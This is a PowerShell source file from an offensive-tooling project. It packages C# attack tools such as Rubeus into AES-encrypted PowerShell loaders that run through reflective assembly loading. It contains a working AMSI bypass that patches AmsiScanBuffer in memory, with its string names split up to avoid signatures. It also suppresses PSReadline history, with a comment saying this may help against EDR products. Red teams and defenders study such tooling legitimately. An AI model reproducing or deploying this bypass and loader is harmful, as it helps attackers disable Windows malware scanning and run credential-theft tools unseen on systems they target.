function ConvertTo-Powershell
{
<#
.SYNOPSIS

Creates powershell wrapper for a C# console application. This allows you to call a powershell function (Invoke-YourBinaryName), which internally unwraps the binary and calls
a predefined function. The .ps1 file is encrypted by default and contains a standard bypass for AMSI. Use "-NoProtection" if you do NOT want encryption and AMSI bypass.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Puts an encrypted copy of a C# binary inside a powershell function. The main goal is to run a C# console application like Rubeus, Seatbelt or others natively from powershell.

Example: instead of running "Rubeus.exe hash /password:123" you can then run 'Invoke-Rubeus -Command "hash /password:123"'

The name of the resulting PS function is always Invoke-"Filename" without the extension

[System.Reflection.Assembly]::Load is used to load the C# code. The "namespace","class" and "function" parameters of ConvertTo-Powershell are used to tell the resulting PS function where to pipe the commands to.

A standard AMSI bypass is called automatically before decryption.

.PARAMETER Path

The path to the C# binary you want to convert.

.PARAMETER Outpath

Where you want to store the generated .ps1 file. Default is ".\Invoke-<filename>.ps1"

.PARAMETER Namespace

Used to build a string in the form of [namespace.class]::function("....") inside the generated powershell function. This will be the command that actually calls your c# code from powershell.

.PARAMETER Class

Used to build a string in the form of [namespace.class]::function("....") inside the generated powershell function. This will be the command that actually calls your c# code from powershell.

.PARAMETER Function

Used to build a string in the form of [namespace.class]::function("....") inside the generated powershell function. This will be the command that actually calls your c# code from powershell.


.PARAMETER NoProtection

Do not use encryption and do not include an AMSI bypass in the result. If you use this parameter, the output ps1 will just include a bas64 encoded version of the source wrapped in a function. Default is "false".


.EXAMPLE

ConvertTo-Powershell -Path "C:\Rubeus.exe" -namespace Rubeus -class Program -function Main

Description
-----------

Creates a powershell wrapper for C:\Rubeus.exe and will pass all commands to the c# code using [Rubeus.Program]::Main()

.EXAMPLE

ConvertTo-Powershell -Path "C:\Rubeus.exe"

Description
-----------

Creates a powershell wrapper for C:\Rubeus.exe. The script will try to automatically determine the entrypoint by loading the assembly beforehand and enumerating the Assembly.EntryPoint property.

.LINK

https://github.com/cfalta/PowerShellArmoury

#>

[CmdletBinding()]
Param (
    [Parameter(Mandatory = $true)]
    [ValidateScript({Test-Path $_})]
    [String]
    $Path,

    [Parameter(Mandatory = $False)]
    [ValidateNotNullorEmpty()]
    [String]
    $Namespace,
    
    [Parameter(Mandatory = $False)]
    [ValidateNotNullorEmpty()]
    [String]
    $Class,
    
    [Parameter(Mandatory = $False)]
    [ValidateNotNullorEmpty()]
    [String]
    $Function,

    [Parameter(Mandatory = $False)]
    [ValidateNotNullorEmpty()]
    [String]
    $Outpath,

    [Parameter(Mandatory = $False)]
    [ValidateNotNullorEmpty()]
    [Switch]
    $NoProtection = $false
    )

$filename = (Get-Item -LiteralPath $Path).name
$fullname = (Get-Item -LiteralPath $Path).fullname
$functionname = $filename.substring(0,$filename.lastindexof("."))
$file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($fullname))
$password = Get-Password -Length 10
$salt = Get-Password -Length 10
$filecrypt = Get-AESEncrypt -Message $file -Password $password -Salt $salt
$cipher = $filecrypt.Ciphertext
$iv = $filecrypt.IV

if(-not $PSBoundParameters['Namespace'] -OR -not $PSBoundParameters['Class'] -or -not $PSBoundParameters['Function'])
{
    $ep = Get-EntryPoint -Path $fullname
    $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
    
}
else {
    $ldrcommand = "[" + $namespace + "." + $class + "]::" + $function + '($Command.Split(" "))'
}


$AMSIBypass=@"
using System;
using System.Runtime.InteropServices;

public class foo {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
$AMSIBypassencoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass))


$BypassStub=@"
#Might help against certain EDRs...
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI
`$AMSIBypassencoded = "$AMSIBypassencoded"
`$niw32 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypassencoded))
Add-Type -TypeDefinition `$niw32
`$l = [foo]::LoadLibrary("am" + "si.dll")
`$a = [foo]::GetProcAddress(`$l, "Amsi" + "Scan" + "Buffer")
`$p = 0
`$null = [foo]::VirtualProtect(`$a, [uint32]5, 0x40, [ref]`$p)
`$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
[System.Runtime.InteropServices.Marshal]::Copy(`$pa, 0, `$a, 6)
"@

$FunctionHeader=@"
function Invoke-$functionname([string]`$Command)
{
"@

$FunctionBodyNoProtection=@"
`$Message="$file"
"@

$FunctionTrailer=@"
`$Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(`$Message))
$ldrcommand
}
"@

$DecryptionStub=@"
[byte[]]`$CipherText = [Convert]::FromBase64String(`"$cipher`")
[byte[]]`$InitVector = [Convert]::FromBase64String(`"$iv`")

`$AES = [System.Security.Cryptography.Aes]::Create()

`$v1=[Text.Encoding]::ASCII.GetBytes(`"$Password`")
`$v2=[Text.Encoding]::ASCII.GetBytes(`"$Salt`")
`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes(`$v1,`$v2,"SHA512",10)

`$AES.Padding = "PKCS7"
`$AES.KeySize = 256
`$AES.Key = `$Key.GetBytes(32)
`$AES.IV = `$InitVector

`$AESDecryptor = `$AES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$AES.Clear()

"@

if(-not $Outpath)
{
    $Outpath = Join-Path (Get-Location) ("Invoke-" + $functionname + ".ps1")
}

if((Test-Path -LiteralPath $Outpath))
{
    Remove-Item -LiteralPath $Outpath -Force
}

if($NoProtection)
{

    Add-Content $Outpath $FunctionHeader
    Add-Content $Outpath $FunctionBodyNoProtection
    Add-Content $Outpath $FunctionTrailer

}
else {
    
    Add-Content $Outpath $FunctionHeader
    Add-Content $Outpath $BypassStub
    Add-Content $Outpath $DecryptionStub
    Add-Content $Outpath $FunctionTrailer

}

}
function Get-Password([int]$Length)
{
    if($Length -gt 0)
    {
        $Alphabet = @("0","1","2","3","4","5","6","7","8","9",":",";","<","=",">","?","!","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z")
        
        for($i=1;$i -le $Length;$i++)
        {
            $Password += $Alphabet | Get-Random    
        }

        return($Password)
    }
}

function Get-AESEncrypt
{
<#
.SYNOPSIS

Get-AESEncrypt encrypts a message using AES-256 and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-AESEncrypt encrypts a message using AES-256. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.EXAMPLE

Get-AESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject.

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt,

        [Parameter(Position = 3, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $Compression
    )

#Create a new instance of the .NET AES provider
$AES = [System.Security.Cryptography.Aes]::Create()

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA512",10)

#The AES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $AES.IV

#Set the parameters for AES encryption
$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)

#Create a new encryptor
$AESCryptor = $AES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

if($Compression)
{
#Compress before encryption
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.GzipStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($MessageBytes, 0, $MessageBytes.Length)
    $DeflateStream.Dispose()
    $CompressedBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
}
else {
    $CompressedBytes = $MessageBytes
}

#Encrypt the message using cryptostream
$CryptoStream.Write($CompressedBytes,0,$CompressedBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}


function Get-EntryPoint
{
    [CmdletBinding()]
    Param (
    [Parameter(Mandatory = $true)]
    [ValidateScript({Test-Path $_})]
    [String]
    $Path)

    $item = Get-Item -Path $Path
    $file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($item.FullName))
    $Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($file))
    $Assembly.EntryPoint
}

